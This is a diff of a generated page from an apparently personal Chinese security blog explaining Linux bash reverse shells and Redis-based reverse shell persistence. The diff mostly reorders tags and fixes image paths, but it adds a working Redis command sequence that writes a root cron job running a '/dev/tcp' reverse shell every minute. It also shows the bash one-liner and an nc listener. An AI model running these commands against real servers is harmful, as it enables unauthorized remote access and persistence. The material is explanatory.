@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Web安全,Linux,Redis," />
+  <meta name="keywords" content="Linux,Web安全,Redis," />
 
 
 
@@ -85,15 +85,15 @@
 <meta property="og:url" content="http://yoursite.com/2020/07/22/Redis%E5%8F%8D%E5%BC%B9Shell/index.html">
 <meta property="og:site_name" content="Oah&#39;s Blog">
 <meta property="og:description" content="背景知识Linux反弹Shell用于Linux反弹Shell的命令如下 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;[port] 0&gt;&amp;1 2&gt;&amp;1  将它分解成以下几个部分，分别理解 1bash -i  打开一个交互式的bash 可以使用命令 echo $- 来判断是否是交互式的Shell，输出结果的解释如下  h：Cache location">
-<meta property="og:image" content="http://yoursite.com/2020/07/22/Redis%E5%8F%8D%E5%BC%B9Shell/Redis%E5%8F%8D%E5%BC%B9Shell/f32373c66a3c506e2710fce67be5859e.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/22/Redis%E5%8F%8D%E5%BC%B9Shell/f32373c66a3c506e2710fce67be5859e.png">
 <meta property="article:published_time" content="2020-07-22T05:18:37.000Z">
-<meta property="article:modified_time" content="2020-07-22T07:45:35.805Z">
+<meta property="article:modified_time" content="2020-07-22T08:27:38.145Z">
 <meta property="article:author" content="Oah">
-<meta property="article:tag" content="Web安全">
 <meta property="article:tag" content="Linux">
+<meta property="article:tag" content="Web安全">
 <meta property="article:tag" content="Redis">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2020/07/22/Redis%E5%8F%8D%E5%BC%B9Shell/Redis%E5%8F%8D%E5%BC%B9Shell/f32373c66a3c506e2710fce67be5859e.png">
+<meta name="twitter:image" content="http://yoursite.com/2020/07/22/Redis%E5%8F%8D%E5%BC%B9Shell/f32373c66a3c506e2710fce67be5859e.png">
 
 
 
@@ -329,7 +329,7 @@
 <li>H：History substitution like !-1</li>
 </ul>
 <p>测试是否是交互式Shell</p>
-<p><img src="Redis%E5%8F%8D%E5%BC%B9Shell/f32373c66a3c506e2710fce67be5859e.png" alt="img"></p>
+<p><img src="f32373c66a3c506e2710fce67be5859e.png" alt="img"></p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dev/tcp/[ip]/[port]</span><br></pre></td></tr></table></figure>
 
 <p>通过ip和端口与另一台主机建立一个socket连接，另一台主机可以通过 <code>nc -lvp [port]</code> 命令与这台主机通信</p>
@@ -410,7 +410,9 @@
 <p>写进定时任务的内容如下，意思是每分钟运行一次反弹Shell的命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;[port] 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
-<h1 id="Redis反弹Shell"><a href="#Redis反弹Shell" class="headerlink" title="Redis反弹Shell"></a>Redis反弹Shell</h1><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/Auuuuuuuu/article/details/89059176" target="_blank" rel="noopener">Linux之bash反弹shell原理浅析_Au-CSDN博客_bash -i</a></p>
+<h1 id="Redis反弹Shell"><a href="#Redis反弹Shell" class="headerlink" title="Redis反弹Shell"></a>Redis反弹Shell</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set shell &quot;*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;[port] 0&gt;&amp;1 2&gt;&amp;1&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/Auuuuuuuu/article/details/89059176" target="_blank" rel="noopener">Linux之bash反弹shell原理浅析_Au-CSDN博客_bash -i</a></p>
 <p><a href="https://www.cnblogs.com/iouwenbo/p/11277453.html" target="_blank" rel="noopener">反弹shell原理与实现 - iouwenbo - 博客园</a></p>
 <p><a href="https://www.runoob.com/linux/linux-shell-io-redirections.html" target="_blank" rel="noopener">Shell 输入/输出重定向 | 菜鸟教程</a></p>
 <p><a href="https://segmentfault.com/a/1190000010975294" target="_blank" rel="noopener">linux反弹shell命令解析 - 个人文章 - SegmentFault 思否</a></p>
@@ -431,9 +433,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
-          
             <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+            <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
           
             <a href="/tags/Redis/" rel="tag"># Redis</a>
           
